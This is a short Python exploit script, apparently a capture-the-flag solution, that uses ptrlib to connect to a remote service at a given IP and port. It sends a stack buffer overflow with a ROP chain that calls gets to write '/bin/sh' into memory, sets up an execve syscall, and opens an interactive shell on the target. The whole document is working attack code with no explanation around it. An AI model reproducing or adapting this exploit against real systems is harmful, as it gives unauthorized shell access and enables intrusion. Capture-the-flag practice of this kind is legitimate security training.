from ptrlib import *

#sock = Process("../distfiles/chall")
sock = Socket("13.231.207.73", 9010)

rop_pop_rdx = 0x004023f5
rop_pop_rsi_r15 = 0x0040141a
rop_pop_rdi = 0x0040141c
rop_pop_rax = 0x00400121
rop_syscall = 0x004024dd
addr_gets = 0x4004ee
addr_binsh = 0x604800

payload = b'A' * 0x108
payload += p64(rop_pop_rdi)
payload += p64(addr_binsh)
payload += p64(addr_gets)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rsi_r15)
payload += p64(0)
payload += p64(0xdeadbeef)
payload += p64(rop_pop_rdi)
payload += p64(addr_binsh)
payload += p64(rop_syscall)

sock.recvline()
sock.sendline(payload)

sock.sendline("/bin/sh")

sock.interactive()
